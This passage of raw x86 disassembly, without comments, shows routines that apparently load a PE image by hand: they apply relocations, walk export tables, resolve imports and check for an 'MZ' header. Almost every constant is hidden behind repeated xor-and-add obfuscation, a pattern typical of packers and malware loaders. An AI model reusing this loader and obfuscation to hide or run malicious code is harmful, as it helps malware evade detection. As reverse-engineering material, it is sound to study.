  426c27:	mov    edx,DWORD PTR [ebp-0xc]
  426c2a:	add    DWORD PTR [ebp-0x8],edx
  426c2d:	mov    edx,DWORD PTR [ebp-0x8]
  426c30:	cmp    edx,DWORD PTR [ecx+0xa4]
  426c36:	jae    0x426c49
  426c38:	add    eax,DWORD PTR [ebp-0xc]
  426c3b:	mov    edx,DWORD PTR [eax+0x4]
  426c3e:	mov    DWORD PTR [ebp-0xc],edx
  426c41:	test   edx,edx
  426c43:	jne    0x426bc1
  426c49:	mov    eax,DWORD PTR [ebp-0x10]
  426c4c:	mov    DWORD PTR [ebp-0x6c],eax
  426c4f:	mov    DWORD PTR [ebp-0x70],0x4
  426c56:	mov    eax,DWORD PTR [ecx+0x50]
  426c59:	mov    DWORD PTR [ebp-0x68],eax
  426c5c:	mov    eax,DWORD PTR [ebp-0x1c]
  426c5f:	xor    eax,esi
  426c61:	add    eax,edi
  426c63:	mov    DWORD PTR [ebp-0x64],eax
  426c66:	lea    eax,[ebp-0x20]
  426c69:	mov    DWORD PTR [ebp-0x60],eax
  426c6c:	lea    eax,[ebp-0x70]
  426c6f:	push   eax
  426c70:	mov    eax,DWORD PTR [ebp+0x8]
  426c73:	xor    eax,esi
  426c75:	add    eax,edi
  426c77:	push   eax
  426c78:	mov    eax,DWORD PTR [ebp+0x20]
  426c7b:	add    eax,0xee
  426c80:	push   eax
  426c81:	mov    eax,DWORD PTR [ebp+0x20]
  426c84:	mov    eax,DWORD PTR [eax+0x198]
  426c8a:	push   DWORD PTR [eax]
  426c8c:	mov    eax,DWORD PTR [ebp+0x10]
  426c8f:	call   eax
  426c91:	mov    eax,DWORD PTR [ebp+0x20]
  426c94:	mov    eax,DWORD PTR [eax+0x180]
  426c9a:	add    eax,DWORD PTR [ebp+0xc]
  426c9d:	mov    ecx,DWORD PTR [ebp+0xc]
  426ca0:	push   DWORD PTR [ebp+0x18]
  426ca3:	mov    DWORD PTR [eax],ecx
  426ca5:	push   DWORD PTR [ebp+0x14]
  426ca8:	push   DWORD PTR [ebp+0x1c]
  426cab:	call   ebx
  426cad:	mov    ecx,DWORD PTR [ebp+0xc]
  426cb0:	add    ecx,DWORD PTR [ebp+0x20]
  426cb3:	lea    eax,[ebp+0x4]
  426cb6:	mov    DWORD PTR [ebp+0x20],ecx
  426cb9:	mov    ecx,DWORD PTR [ebp+0x20]
  426cbc:	mov    ecx,DWORD PTR [ebp+0x20]
  426cbf:	mov    edx,DWORD PTR [ecx+0x190]
  426cc5:	mov    ecx,DWORD PTR [ebp+0x20]
  426cc8:	mov    ecx,DWORD PTR [ecx+0x18c]
  426cce:	mov    esi,DWORD PTR [ecx]
  426cd0:	cmp    DWORD PTR [eax],esi
  426cd2:	jb     0x426cf3
  426cd4:	mov    esi,DWORD PTR [edx]
  426cd6:	mov    edi,DWORD PTR [edx]
  426cd8:	mov    esi,DWORD PTR [esi+0x3c]
  426cdb:	lea    esi,[edi+esi*1+0x50]
  426cdf:	mov    edi,DWORD PTR [ecx]
  426ce1:	add    edi,DWORD PTR [esi]
  426ce3:	cmp    DWORD PTR [eax],edi
  426ce5:	jae    0x426cf3
  426ce7:	mov    esi,DWORD PTR [ecx]
  426ce9:	mov    ecx,DWORD PTR [eax]
  426ceb:	mov    edx,DWORD PTR [edx]
  426ced:	sub    ecx,esi
  426cef:	add    edx,ecx
  426cf1:	mov    DWORD PTR [eax],edx
  426cf3:	mov    eax,DWORD PTR [ebp+0xc]
  426cf6:	jmp    0x426cfa
  426cf8:	xor    eax,eax
  426cfa:	pop    edi
  426cfb:	pop    esi
  426cfc:	pop    ebx
  426cfd:	leave  
  426cfe:	ret    0x1c
  426d01:	push   ebp
  426d02:	mov    ebp,esp
  426d04:	sub    esp,0x1c
  426d07:	push   esi
  426d08:	mov    esi,eax
  426d0a:	mov    eax,DWORD PTR [ecx+0x190]
  426d10:	cmp    DWORD PTR [eax],0x0
  426d13:	je     0x426e23
  426d19:	test   edx,edx
  426d1b:	je     0x426e23
  426d21:	test   esi,esi
  426d23:	je     0x426e23
  426d29:	mov    eax,DWORD PTR [esi+0x88]
  426d2f:	test   eax,eax
  426d31:	je     0x426e1e
  426d37:	cmp    DWORD PTR [esi+0x8c],0x10
  426d3e:	je     0x426e1e
  426d44:	cmp    DWORD PTR [esi+0x34],edx
  426d47:	je     0x426e1e
  426d4d:	mov    esi,DWORD PTR [ecx+0x18c]
  426d53:	and    DWORD PTR [ebp-0x10],0x0
  426d57:	mov    ecx,edx
  426d59:	sub    ecx,DWORD PTR [esi]
  426d5b:	add    eax,edx
  426d5d:	movzx  edx,WORD PTR [eax+0xc]
  426d61:	mov    DWORD PTR [ebp-0x1c],ecx
  426d64:	movzx  ecx,WORD PTR [eax+0xe]
  426d68:	add    ecx,edx
  426d6a:	je     0x426e1e
  426d70:	lea    ecx,[eax+0x14]
  426d73:	push   ebx
  426d74:	mov    DWORD PTR [ebp-0x18],ecx
  426d77:	mov    esi,0x7fffffff
  426d7c:	push   edi
  426d7d:	test   DWORD PTR [ecx],esi
  426d7f:	je     0x426e00
  426d81:	mov    edx,DWORD PTR [ecx]
  426d83:	and    DWORD PTR [ebp-0xc],0x0
  426d87:	and    edx,esi
  426d89:	add    edx,eax
  426d8b:	movzx  edi,WORD PTR [edx+0xe]
  426d8f:	movzx  ebx,WORD PTR [edx+0xc]
  426d93:	add    edi,ebx
  426d95:	je     0x426e00
  426d97:	lea    ecx,[edx+0x14]
  426d9a:	mov    DWORD PTR [ebp-0x14],ecx
  426d9d:	test   DWORD PTR [ecx],esi
  426d9f:	je     0x426de2
  426da1:	mov    ecx,DWORD PTR [ecx]
  426da3:	and    DWORD PTR [ebp-0x8],0x0
  426da7:	and    ecx,esi
  426da9:	add    ecx,eax
  426dab:	movzx  edi,WORD PTR [ecx+0xe]
  426daf:	movzx  ebx,WORD PTR [ecx+0xc]
  426db3:	add    edi,ebx
  426db5:	je     0x426de2
  426db7:	lea    edi,[ecx+0x14]
  426dba:	mov    DWORD PTR [ebp-0x4],edi
  426dbd:	mov    edi,DWORD PTR [ebp-0x4]
  426dc0:	mov    edi,DWORD PTR [edi]
  426dc2:	test   edi,edi
  426dc4:	je     0x426dcc
  426dc6:	mov    ebx,DWORD PTR [ebp-0x1c]
  426dc9:	add    DWORD PTR [edi+eax*1],ebx
  426dcc:	movzx  edi,WORD PTR [ecx+0xe]
  426dd0:	movzx  ebx,WORD PTR [ecx+0xc]
  426dd4:	inc    DWORD PTR [ebp-0x8]
  426dd7:	add    DWORD PTR [ebp-0x4],0x8
  426ddb:	add    edi,ebx
  426ddd:	cmp    DWORD PTR [ebp-0x8],edi
  426de0:	jb     0x426dbd
  426de2:	movzx  edi,WORD PTR [edx+0xe]
  426de6:	movzx  ebx,WORD PTR [edx+0xc]
  426dea:	mov    ecx,DWORD PTR [ebp-0x14]
  426ded:	inc    DWORD PTR [ebp-0xc]
  426df0:	add    ecx,0x8
  426df3:	add    edi,ebx
  426df5:	mov    DWORD PTR [ebp-0x14],ecx
  426df8:	cmp    DWORD PTR [ebp-0xc],edi
  426dfb:	jb     0x426d9d
  426dfd:	mov    ecx,DWORD PTR [ebp-0x18]
  426e00:	movzx  edx,WORD PTR [eax+0xe]
  426e04:	movzx  edi,WORD PTR [eax+0xc]
  426e08:	inc    DWORD PTR [ebp-0x10]
  426e0b:	add    ecx,0x8
  426e0e:	add    edx,edi
  426e10:	mov    DWORD PTR [ebp-0x18],ecx
  426e13:	cmp    DWORD PTR [ebp-0x10],edx
  426e16:	jb     0x426d7d
  426e1c:	pop    edi
  426e1d:	pop    ebx
  426e1e:	xor    eax,eax
  426e20:	inc    eax
  426e21:	jmp    0x426e25
  426e23:	xor    eax,eax
  426e25:	pop    esi
  426e26:	leave  
  426e27:	ret    
  426e28:	push   ebp
  426e29:	mov    ebp,esp
  426e2b:	mov    ecx,DWORD PTR [ecx+0x190]
  426e31:	mov    eax,DWORD PTR [ebp+0xc]
  426e34:	sub    esp,0x10
  426e37:	push   ebx
  426e38:	xor    ebx,ebx
  426e3a:	push   esi
  426e3b:	push   edi
  426e3c:	cmp    DWORD PTR [ecx],ebx
  426e3e:	je     0x426ec6
  426e44:	cmp    eax,ebx
  426e46:	je     0x426ec6
  426e48:	cmp    DWORD PTR [eax+0x78],ebx
  426e4b:	jne    0x426e52
  426e4d:	xor    eax,eax
  426e4f:	inc    eax
  426e50:	jmp    0x426ec8
  426e52:	mov    eax,DWORD PTR [eax+0x78]
  426e55:	add    eax,DWORD PTR [ebp+0x8]
  426e58:	mov    ecx,DWORD PTR [eax+0x1c]
  426e5b:	mov    edx,DWORD PTR [eax+0x24]
  426e5e:	mov    esi,DWORD PTR [eax+0x14]
  426e61:	mov    edi,DWORD PTR [eax+0x18]
  426e64:	add    ecx,DWORD PTR [ebp+0x8]
  426e67:	add    edx,DWORD PTR [ebp+0x8]
  426e6a:	mov    DWORD PTR [ebp-0x4],esi
  426e6d:	cmp    esi,edi
  426e6f:	ja     0x426e74
  426e71:	mov    DWORD PTR [ebp-0x4],edi
  426e74:	mov    DWORD PTR [ebp-0x8],ebx
  426e77:	cmp    DWORD PTR [ebp-0x4],ebx
  426e7a:	jbe    0x426e4d
  426e7c:	cmp    ebx,DWORD PTR [eax+0x14]
  426e7f:	jae    0x426e87
  426e81:	movzx  esi,WORD PTR [edx+ebx*2]
  426e85:	jmp    0x426e89
  426e87:	mov    esi,ebx
  426e89:	lea    esi,[ecx+esi*4]
  426e8c:	mov    edi,DWORD PTR [esi]
  426e8e:	test   edi,edi
  426e90:	je     0x426ebb
  426e92:	add    edi,DWORD PTR [ebp+0x8]
  426e95:	mov    DWORD PTR [ebp-0x10],edi
  426e98:	cmp    edi,eax
  426e9a:	jbe    0x426eac
  426e9c:	mov    ebx,DWORD PTR [ebp+0xc]
  426e9f:	mov    ebx,DWORD PTR [ebx+0x7c]
  426ea2:	add    ebx,eax
  426ea4:	cmp    edi,ebx
  426ea6:	jae    0x426eac
  426ea8:	mov    esi,DWORD PTR [esi]
  426eaa:	jmp    0x426eb4
  426eac:	sub    edi,DWORD PTR [ebp+0x8]
  426eaf:	mov    DWORD PTR [esi],edi
  426eb1:	mov    esi,DWORD PTR [ebp-0x10]
  426eb4:	test   esi,esi
  426eb6:	je     0x426ec6
  426eb8:	mov    ebx,DWORD PTR [ebp-0x8]
  426ebb:	inc    ebx
  426ebc:	mov    DWORD PTR [ebp-0x8],ebx
  426ebf:	cmp    ebx,DWORD PTR [ebp-0x4]
  426ec2:	jb     0x426e7c
  426ec4:	jmp    0x426e4d
  426ec6:	xor    eax,eax
  426ec8:	pop    edi
  426ec9:	pop    esi
  426eca:	pop    ebx
  426ecb:	leave  
  426ecc:	ret    0x8
  426ecf:	push   ebp
  426ed0:	mov    ebp,esp
  426ed2:	sub    esp,0x2c
  426ed5:	mov    edx,0xf89c85a5
  426eda:	mov    DWORD PTR [ebp-0x4],edx
  426edd:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  426ee4:	mov    eax,DWORD PTR [ebp-0x4]
  426ee7:	mov    ecx,DWORD PTR [ebp-0x4]
  426eea:	mov    ecx,DWORD PTR [ebp-0x4]
  426eed:	mov    ecx,DWORD PTR [ebp-0x4]
  426ef0:	mov    ecx,DWORD PTR [ebp-0x4]
  426ef3:	mov    ecx,DWORD PTR [ebp-0x4]
  426ef6:	push   ebx
  426ef7:	mov    ebx,DWORD PTR [ebp+0x10]
  426efa:	push   esi
  426efb:	mov    esi,0x75108aa
  426f00:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  426f07:	mov    ecx,DWORD PTR [ebp-0x4]
  426f0a:	mov    ebx,DWORD PTR [ebx+0x190]
  426f10:	push   edi
  426f11:	mov    edi,0x3272f1
  426f16:	xor    ecx,esi
  426f18:	xor    eax,esi
  426f1a:	add    eax,edi
  426f1c:	add    ecx,edi
  426f1e:	mov    DWORD PTR [ebp-0x18],eax
  426f21:	cmp    ecx,DWORD PTR [ebx]
  426f23:	je     0x4271a4
  426f29:	mov    ebx,DWORD PTR [ebp-0x4]
  426f2c:	mov    ecx,DWORD PTR [ebp+0xc]
  426f2f:	xor    ebx,esi
  426f31:	add    ebx,edi
  426f33:	cmp    ebx,ecx
  426f35:	je     0x4271a4
  426f3b:	mov    ebx,DWORD PTR [ebp-0x4]
  426f3e:	mov    ecx,DWORD PTR [ecx+0x80]
  426f44:	xor    ebx,esi
  426f46:	add    ebx,edi
  426f48:	cmp    ecx,ebx
  426f4a:	je     0x42719f
  426f50:	add    ecx,DWORD PTR [ebp+0x8]
  426f53:	mov    DWORD PTR [ebp-0x2c],ecx
  426f56:	mov    ebx,edx
  426f58:	xor    ebx,esi
  426f5a:	add    ebx,edi
  426f5c:	mov    DWORD PTR [ebp-0x10],ebx
  426f5f:	mov    ebx,DWORD PTR [ebp-0x10]
  426f62:	cmp    ebx,edx
  426f64:	je     0x426f78
  426f66:	mov    edx,DWORD PTR [ebp-0x10]
  426f69:	mov    ebx,DWORD PTR [ebp-0x4]
  426f6c:	imul   edx,edx,0x14
  426f6f:	xor    ebx,esi
  426f71:	add    ebx,edi
  426f73:	cmp    DWORD PTR [edx+ecx*1],ebx
  426f76:	jne    0x426f8f
  426f78:	mov    edx,DWORD PTR [ebp-0x10]
  426f7b:	mov    ebx,DWORD PTR [ebp-0x4]
  426f7e:	imul   edx,edx,0x14
  426f81:	xor    ebx,esi
  426f83:	add    ebx,edi
  426f85:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  426f89:	je     0x427191
  426f8f:	mov    eax,DWORD PTR [ebp-0x4]
  426f92:	mov    ebx,DWORD PTR [ebp-0x4]
  426f95:	mov    eax,DWORD PTR [ebp-0x10]
  426f98:	imul   eax,eax,0x14
  426f9b:	add    eax,ecx
  426f9d:	mov    ecx,DWORD PTR [eax+0x10]
  426fa0:	add    ecx,DWORD PTR [ebp+0x8]
  426fa3:	xor    ebx,esi
  426fa5:	mov    DWORD PTR [ebp-0x1c],ecx
  426fa8:	mov    ecx,DWORD PTR [ebp-0x4]
  426fab:	mov    edx,DWORD PTR [ebp-0x4]
  426fae:	xor    ecx,esi
  426fb0:	add    ecx,edi
  426fb2:	xor    edx,esi
  426fb4:	mov    DWORD PTR [ebp-0x24],ecx
  426fb7:	mov    ecx,DWORD PTR [eax]
  426fb9:	add    edx,edi
  426fbb:	add    ebx,edi
  426fbd:	cmp    ecx,edx
  426fbf:	je     0x426fc7
  426fc1:	add    ecx,DWORD PTR [ebp+0x8]
  426fc4:	mov    DWORD PTR [ebp-0x24],ecx
  426fc7:	mov    ecx,DWORD PTR [ebp-0x4]
  426fca:	xor    ecx,esi
  426fcc:	add    ecx,DWORD PTR [eax+0xc]
  426fcf:	mov    eax,DWORD PTR [ebp+0x8]
  426fd2:	lea    eax,[ecx+eax*1+0x3272f1]
  426fd9:	mov    DWORD PTR [ebp+0xc],eax
  426fdc:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  426fe3:	mov    eax,DWORD PTR [ebp+0x10]
  426fe6:	push   DWORD PTR [ebp+0xc]
  426fe9:	mov    eax,DWORD PTR [eax+0x1e0]
  426fef:	call   DWORD PTR [eax]
  426ff1:	mov    ecx,DWORD PTR [ebp-0x4]
  426ff4:	xor    ecx,esi
  426ff6:	add    ecx,edi
  426ff8:	mov    DWORD PTR [ebp-0xc],eax
  426ffb:	cmp    ecx,eax
  426ffd:	jne    0x427011
  426fff:	mov    eax,DWORD PTR [ebp+0x10]
  427002:	push   DWORD PTR [ebp+0xc]
  427005:	mov    eax,DWORD PTR [eax+0x1e0]
  42700b:	call   DWORD PTR [eax+0xc]
  42700e:	mov    DWORD PTR [ebp-0xc],eax
  427011:	mov    DWORD PTR [ebp-0x20],0x7f661b22
  427018:	mov    DWORD PTR [ebp-0x20],0xf89c9852
  42701f:	mov    eax,DWORD PTR [ebp-0x4]
  427022:	xor    eax,esi
  427024:	add    eax,edi
  427026:	cmp    eax,DWORD PTR [ebp-0xc]
  427029:	jne    0x42704e
  42702b:	mov    eax,DWORD PTR [ebp-0x8]
  42702e:	mov    ecx,DWORD PTR [ebp-0x20]
  427031:	xor    eax,esi
  427033:	xor    ecx,esi
  427035:	lea    ebx,[ebx+eax*1+0x3272f1]
  42703c:	mov    eax,DWORD PTR [ebp+0x10]
  42703f:	mov    eax,DWORD PTR [eax+0x1e0]
  427045:	add    ecx,edi
  427047:	imul   ecx,ebx
  42704a:	push   ecx
  42704b:	call   DWORD PTR [eax+0x24]
  42704e:	mov    eax,DWORD PTR [ebp-0x4]
  427051:	xor    eax,esi
  427053:	add    eax,edi
  427055:	cmp    eax,DWORD PTR [ebp-0xc]
  427058:	jne    0x427069
  42705a:	mov    eax,DWORD PTR [ebp-0x28]
  42705d:	xor    eax,esi
  42705f:	add    eax,edi
  427061:	cmp    ebx,eax
  427063:	jbe    0x426fe3
  427069:	mov    eax,DWORD PTR [ebp-0x4]
  42706c:	xor    eax,esi
  42706e:	add    eax,edi
  427070:	cmp    eax,DWORD PTR [ebp-0xc]
  427073:	jne    0x42708c
  427075:	mov    eax,DWORD PTR [ebp-0x8]
  427078:	mov    ecx,DWORD PTR [ebp-0x18]
  42707b:	xor    eax,esi
  42707d:	lea    eax,[ecx+eax*1+0x3272f1]
  427084:	mov    DWORD PTR [ebp-0x18],eax
  427087:	jmp    0x42717b
  42708c:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  427093:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  42709a:	mov    ebx,DWORD PTR [ebp-0x4]
  42709d:	xor    ebx,esi
  42709f:	add    ebx,edi
  4270a1:	jmp    0x427168
  4270a6:	mov    eax,DWORD PTR [ebp-0x4]
  4270a9:	xor    eax,esi
  4270ab:	add    eax,edi
  4270ad:	mov    DWORD PTR [ebp-0x14],eax
  4270b0:	mov    eax,DWORD PTR [ebp-0x4]
  4270b3:	xor    eax,esi
  4270b5:	add    eax,edi
  4270b7:	mov    DWORD PTR [ebp+0xc],eax
  4270ba:	mov    ecx,DWORD PTR [ebp-0x4]
  4270bd:	mov    eax,DWORD PTR [ebp-0x24]
  4270c0:	xor    ecx,esi
  4270c2:	add    ecx,edi
  4270c4:	cmp    ecx,eax
  4270c6:	je     0x4270ce
  4270c8:	mov    eax,DWORD PTR [eax+ebx*4]
  4270cb:	mov    DWORD PTR [ebp-0x14],eax
  4270ce:	mov    eax,DWORD PTR [ebp-0x1c]
  4270d1:	mov    eax,DWORD PTR [eax+ebx*4]
  4270d4:	mov    DWORD PTR [ebp+0xc],eax
  4270d7:	mov    eax,DWORD PTR [ebp-0x4]
  4270da:	mov    ecx,DWORD PTR [ebp-0x14]
  4270dd:	xor    eax,esi
  4270df:	add    eax,edi
  4270e1:	cmp    eax,ecx
  4270e3:	je     0x42710e
  4270e5:	mov    eax,DWORD PTR [ebp-0x4]
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	xor    eax,esi
  4270ed:	add    eax,edi
  4270ef:	shr    ecx,0x1f
  4270f2:	cmp    eax,ecx
  4270f4:	je     0x42710e
  4270f6:	mov    ecx,DWORD PTR [ebp-0x14]
  4270f9:	mov    eax,DWORD PTR [ebp+0x10]
  4270fc:	mov    eax,DWORD PTR [eax+0x1e0]
  427102:	movzx  ecx,cx
  427105:	push   ecx
  427106:	push   DWORD PTR [ebp-0xc]
  427109:	call   DWORD PTR [eax+0x8]
  42710c:	jmp    0x427127
  42710e:	mov    eax,DWORD PTR [ebp+0xc]
  427111:	add    eax,DWORD PTR [ebp+0x8]
  427114:	mov    ecx,DWORD PTR [ebp+0x10]
  427117:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42711d:	add    eax,0x2
  427120:	push   eax
  427121:	push   DWORD PTR [ebp-0xc]
  427124:	call   DWORD PTR [ecx+0x8]
  427127:	mov    DWORD PTR [ebp+0xc],eax
  42712a:	mov    eax,DWORD PTR [ebp-0x4]
  42712d:	mov    ecx,DWORD PTR [ebp+0xc]
  427130:	xor    eax,esi
  427132:	add    eax,edi
  427134:	cmp    eax,ecx
  427136:	mov    eax,DWORD PTR [ebp-0x8]
  427139:	jne    0x42714c
  42713b:	mov    ecx,DWORD PTR [ebp-0x18]
  42713e:	xor    eax,esi
  427140:	lea    eax,[ecx+eax*1+0x3272f1]
  427147:	mov    DWORD PTR [ebp-0x18],eax
  42714a:	jmp    0x42715c
  42714c:	mov    ecx,DWORD PTR [ebp+0xc]
  42714f:	xor    eax,esi
  427151:	add    eax,edi
  427153:	imul   eax,ecx
  427156:	mov    ecx,DWORD PTR [ebp-0x1c]
  427159:	mov    DWORD PTR [ecx+ebx*4],eax
  42715c:	mov    eax,DWORD PTR [ebp-0x8]
  42715f:	xor    eax,esi
  427161:	lea    ebx,[ebx+eax*1+0x3272f1]
  427168:	mov    eax,DWORD PTR [ebp-0x4]
  42716b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42716e:	xor    eax,esi
  427170:	add    eax,edi
  427172:	cmp    DWORD PTR [ecx+ebx*4],eax
  427175:	jne    0x4270a6
  42717b:	mov    edx,DWORD PTR [ebp-0x10]
  42717e:	mov    ecx,DWORD PTR [ebp-0x2c]
  427181:	mov    eax,DWORD PTR [ebp-0x18]
  427184:	sub    edx,0x3272f0
  42718a:	xor    edx,esi
  42718c:	jmp    0x426f56
  427191:	mov    ecx,DWORD PTR [ebp-0x4]
  427194:	xor    ecx,esi
  427196:	add    ecx,edi
  427198:	cmp    eax,ecx
  42719a:	mov    eax,DWORD PTR [ebp-0x4]
  42719d:	jne    0x4271a7
  42719f:	mov    eax,DWORD PTR [ebp-0x8]
  4271a2:	jmp    0x4271a7
  4271a4:	mov    eax,DWORD PTR [ebp-0x4]
  4271a7:	xor    eax,esi
  4271a9:	add    eax,edi
  4271ab:	pop    edi
  4271ac:	pop    esi
  4271ad:	pop    ebx
  4271ae:	leave  
  4271af:	ret    0xc
  4271b2:	push   ebp
  4271b3:	mov    ebp,esp
  4271b5:	sub    esp,0x28
  4271b8:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4271bf:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  4271c6:	mov    eax,DWORD PTR [ebp+0xc]
  4271c9:	mov    DWORD PTR [ebp+0xc],eax
  4271cc:	push   esi
  4271cd:	mov    eax,eax
  4271cf:	mov    eax,DWORD PTR [ebp-0x4]
  4271d2:	mov    esi,DWORD PTR [ebp+0x8]
  4271d5:	mov    ecx,0x75108aa
  4271da:	xor    eax,ecx
  4271dc:	mov    edx,0x3272f1
  4271e1:	add    eax,edx
  4271e3:	cmp    esi,eax
  4271e5:	je     0x42730c
  4271eb:	mov    eax,DWORD PTR [ebp+0x8]
  4271ee:	mov    esi,DWORD PTR [ebp+0x8]
  4271f1:	add    esi,DWORD PTR [eax+0x3c]
  4271f4:	push   edi
  4271f5:	mov    DWORD PTR [ebp+0xc],esi
  4271f8:	mov    DWORD PTR [ebp-0x1c],0xf89c85be
  4271ff:	mov    eax,DWORD PTR [ebp-0x1c]
  427202:	mov    esi,DWORD PTR [ebp-0x4]
  427205:	mov    edi,DWORD PTR [ebp+0xc]
  427208:	xor    esi,ecx
  42720a:	xor    eax,ecx
  42720c:	add    esi,edx
  42720e:	cmp    DWORD PTR [edi+eax*8+0x1939800],esi
  427215:	je     0x427306
  42721b:	mov    esi,DWORD PTR [ebp+0xc]
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	add    eax,DWORD PTR [esi+0xa0]
  427227:	mov    esi,DWORD PTR [ebp+0x8]
  42722a:	mov    edi,DWORD PTR [ebp+0xc]
  42722d:	sub    esi,DWORD PTR [edi+0x34]
  427230:	mov    edi,DWORD PTR [ebp-0x4]
  427233:	xor    edi,ecx
  427235:	add    edi,edx
  427237:	mov    DWORD PTR [ebp-0x24],esi
  42723a:	cmp    esi,edi
  42723c:	je     0x427306
  427242:	mov    esi,DWORD PTR [ebp-0x4]
  427245:	xor    esi,ecx
  427247:	add    esi,edx
  427249:	mov    DWORD PTR [ebp-0x8],esi
  42724c:	push   ebx
  42724d:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  427254:	jmp    0x4272f0
  427259:	mov    esi,DWORD PTR [ebp-0x4]
  42725c:	xor    esi,ecx
  42725e:	lea    edi,[ebx-0x8]
  427261:	add    esi,edx
  427263:	shr    edi,1
  427265:	cmp    esi,edi
  427267:	jae    0x4272d6
  427269:	sub    edi,esi
  42726b:	lea    ebx,[eax+esi*2+0x8]
  42726f:	mov    DWORD PTR [ebp-0x18],edi
  427272:	movzx  esi,WORD PTR [ebx]
  427275:	and    esi,0xfff
  42727b:	mov    DWORD PTR [ebp-0x14],esi
  42727e:	mov    edi,DWORD PTR [ebp-0x14]
  427281:	mov    esi,DWORD PTR [eax]
  427283:	sub    esi,edx
  427285:	add    edi,esi
  427287:	movzx  esi,WORD PTR [ebx]
  42728a:	shr    esi,0xc
  42728d:	xor    edi,ecx
  42728f:	mov    DWORD PTR [ebp-0x20],edi
  427292:	mov    DWORD PTR [ebp-0x14],esi
  427295:	mov    esi,DWORD PTR [ebp-0x20]
  427298:	mov    edi,DWORD PTR [ebp+0x8]
  42729b:	xor    esi,ecx
  42729d:	lea    esi,[esi+edi*1+0x3272f1]
  4272a4:	mov    DWORD PTR [ebp-0x20],esi
  4272a7:	mov    esi,DWORD PTR [ebp-0x10]
  4272aa:	mov    edi,DWORD PTR [ebp-0x14]
  4272ad:	xor    esi,ecx
  4272af:	add    esi,edx
  4272b1:	cmp    edi,esi
  4272b3:	jne    0x4272cb
  4272b5:	mov    esi,DWORD PTR [ebp-0x10]
  4272b8:	mov    edi,DWORD PTR [ebp-0x14]
  4272bb:	xor    esi,ecx
  4272bd:	add    esi,edx
  4272bf:	cmp    edi,esi
  4272c1:	jne    0x4272cb
  4272c3:	mov    esi,DWORD PTR [ebp-0x20]
  4272c6:	mov    edi,DWORD PTR [ebp-0x24]
  4272c9:	add    DWORD PTR [esi],edi
  4272cb:	add    ebx,0x2
  4272ce:	dec    DWORD PTR [ebp-0x18]
  4272d1:	jne    0x427272
  4272d3:	mov    ebx,DWORD PTR [ebp-0xc]
  4272d6:	add    DWORD PTR [ebp-0x8],ebx
  4272d9:	mov    esi,DWORD PTR [ebp-0x1c]
  4272dc:	mov    edi,DWORD PTR [ebp-0x8]
  4272df:	mov    ebx,DWORD PTR [ebp+0xc]
  4272e2:	xor    esi,ecx
  4272e4:	cmp    edi,DWORD PTR [ebx+esi*8+0x1939804]
  4272eb:	jae    0x427305
  4272ed:	add    eax,DWORD PTR [ebp-0xc]
  4272f0:	mov    esi,DWORD PTR [ebp-0x4]
  4272f3:	mov    ebx,DWORD PTR [eax+0x4]
  4272f6:	xor    esi,ecx
  4272f8:	add    esi,edx
  4272fa:	mov    DWORD PTR [ebp-0xc],ebx
  4272fd:	cmp    ebx,esi
  4272ff:	jne    0x427259
  427305:	pop    ebx
  427306:	mov    eax,DWORD PTR [ebp-0x28]
  427309:	pop    edi
  42730a:	jmp    0x42730f
  42730c:	mov    eax,DWORD PTR [ebp-0x4]
  42730f:	xor    eax,ecx
  427311:	add    eax,edx
  427313:	pop    esi
  427314:	leave  
  427315:	ret    0x8
  427318:	push   ebp
  427319:	mov    ebp,esp
  42731b:	sub    esp,0xd8
  427321:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  427328:	mov    DWORD PTR [ebp-0x24],0xf89c85ba
  42732f:	mov    eax,DWORD PTR [ebp-0x4]
  427332:	push   ebx
  427333:	push   esi
  427334:	mov    esi,0x75108aa
  427339:	xor    eax,esi
  42733b:	push   edi
  42733c:	mov    edi,0x3272f1
  427341:	add    eax,edi
  427343:	mov    DWORD PTR [ebp-0x18],eax
  427346:	mov    eax,DWORD PTR [ebp-0x4]
  427349:	xor    eax,esi
  42734b:	add    eax,edi
  42734d:	mov    DWORD PTR [ebp-0x8],eax
  427350:	mov    ebx,DWORD PTR [ebp+0x20]
  427353:	mov    eax,DWORD PTR [ebp-0x1c]
  427356:	mov    ecx,DWORD PTR [ebp-0x1c]
  427359:	xor    eax,ecx
  42735b:	mov    DWORD PTR [ebp-0x1c],eax
  42735e:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  427365:	mov    eax,DWORD PTR [ebp-0xc]
  427368:	mov    ecx,DWORD PTR [ebp-0xc]
  42736b:	xor    eax,ecx
  42736d:	mov    DWORD PTR [ebp-0xc],eax
  427370:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  427377:	mov    eax,DWORD PTR [ebp-0x10]
  42737a:	mov    ecx,DWORD PTR [ebp-0x10]
  42737d:	xor    eax,ecx
  42737f:	mov    DWORD PTR [ebp-0x10],eax
  427382:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  427389:	mov    eax,DWORD PTR [ebp-0x28]
  42738c:	mov    ecx,DWORD PTR [ebp-0x28]
  42738f:	xor    eax,ecx
  427391:	mov    DWORD PTR [ebp-0x28],eax
  427394:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  42739b:	mov    DWORD PTR [ebp+0x20],0xf89ceff6
  4273a2:	mov    eax,DWORD PTR [ebp+0x8]
  4273a5:	test   eax,eax
  4273a7:	je     0x427830
  4273ad:	mov    eax,DWORD PTR [ebp+0xc]
  4273b0:	test   eax,eax
  4273b2:	je     0x427830
  4273b8:	mov    eax,DWORD PTR [ebp+0x18]
  4273bb:	test   eax,eax
  4273bd:	je     0x427830
  4273c3:	mov    eax,DWORD PTR [ebp+0x20]
  4273c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4273c9:	xor    eax,0x8aa
  4273ce:	add    eax,0x72f1
  4273d3:	cmp    WORD PTR [ecx],ax
  4273d6:	jne    0x427830
